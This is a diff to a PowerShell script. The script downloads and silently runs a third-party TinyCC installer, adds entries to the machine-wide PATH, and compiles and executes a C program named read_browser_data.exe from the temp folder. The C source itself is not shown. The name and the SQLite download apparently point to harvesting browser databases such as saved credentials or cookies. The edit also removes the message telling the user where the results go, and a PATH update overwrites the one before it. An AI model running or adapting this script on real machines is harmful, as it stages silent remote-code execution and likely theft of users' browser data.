@@ -1,10 +1,10 @@
 # Define the URLs for the downloads
 $sqliteUrl = "https://github.com/sqlite/sqlite/archive/refs/heads/master.zip"
-$tccUrl = "https://github.com/TinyCC/tinycc/archive/refs/heads/mob.zip"
+$tccUrl = "https://github.com/cnlohr/tinycc-win64-installer/releases/download/v0_0.9.27/tcc-0.9.27-win64-installer.exe"
 $zipFilePath = "$env:TEMP\sqlite.zip"
-$tccZipPath = "$env:TEMP\tcc.zip"
+$tccInstallerPath = "$env:TEMP\tcc-installer.exe"
 $sqliteExtractPath = "$env:ProgramFiles\SQLite"
-$tccExtractPath = "$env:ProgramFiles\TinyCC"
+$tccInstallPath = "$env:ProgramFiles\TinyCC"
 
 # Download the SQLite source ZIP file
 Write-Output "Downloading SQLite source..."
@@ -22,21 +22,28 @@ Expand-Archive -Path $zipFilePath -DestinationPath $sqliteExtractPath -Force
 # Clean up SQLite ZIP file
 Remove-Item -Path $zipFilePath
 
-# Download TCC
-Write-Output "Downloading TCC..."
-Invoke-WebRequest -Uri $tccUrl -OutFile $tccZipPath
+# Download the TCC installer
+Write-Output "Downloading TCC installer..."
+Invoke-WebRequest -Uri $tccUrl -OutFile $tccInstallerPath
 
-# Create the extraction directory if it doesn't exist
-if (-Not (Test-Path -Path $tccExtractPath)) {
-    New-Item -ItemType Directory -Path $tccExtractPath
+# Run the TCC installer
+Write-Output "Running TCC installer..."
+Start-Process -FilePath $tccInstallerPath -ArgumentList "/SILENT", "/DIR=$tccInstallPath" -Wait
+
+# Clean up TCC installer
+Remove-Item -Path $tccInstallerPath
+
+# Add TCC and SQLite to the system PATH
+Write-Output "Adding TCC and SQLite to the system PATH..."
+$tccBinPath = "$tccInstallPath"
+$sqliteBinPath = "$sqliteExtractPath\sqlite-master"
+$envPath = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
+if (-Not $envPath.Contains($tccBinPath)) {
+    [System.Environment]::SetEnvironmentVariable("Path", "$envPath;$tccBinPath", [System.EnvironmentVariableTarget]::Machine)
 }
-
-# Extract the TCC ZIP file
-Write-Output "Extracting TCC..."
-Expand-Archive -Path $tccZipPath -DestinationPath $tccExtractPath -Force
-
-# Clean up TCC ZIP file
-Remove-Item -Path $tccZipPath
+if (-Not $envPath.Contains($sqliteBinPath)) {
+    [System.Environment]::SetEnvironmentVariable("Path", "$envPath;$sqliteBinPath", [System.EnvironmentVariableTarget]::Machine)
+}
 
 # Define the C code
 $cCode = @'
@@ -150,8 +157,13 @@ Set-Content -Path $cFilePath -Value $cCode
 
 # Compile the C code using TCC
 Write-Output "Compiling the C code..."
-cd "$tccExtractPath\tinycc-mob"
-.\tcc.exe -o "$env:TEMP\read_browser_data.exe" $cFilePath
+$tccBinPath = "$tccInstallPath"
+$envPath = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
+if (-Not $envPath.Contains($tccBinPath)) {
+    [System.Environment]::SetEnvironmentVariable("Path", "$envPath;$tccBinPath", [System.EnvironmentVariableTarget]::Machine)
+}
+cd $tccBinPath
+tcc.exe -o "$env:TEMP\read_browser_data.exe" $cFilePath
 
 Write-Output "Compilation completed successfully!"
 
@@ -159,4 +171,4 @@ Write-Output "Compilation completed successfully!"
 Write-Output "Executing the compiled program..."
 & "$env:TEMP\read_browser_data.exe"
 
-Write-Output "Execution completed. Check output.csv for results."
+Write-Output "Executing..."
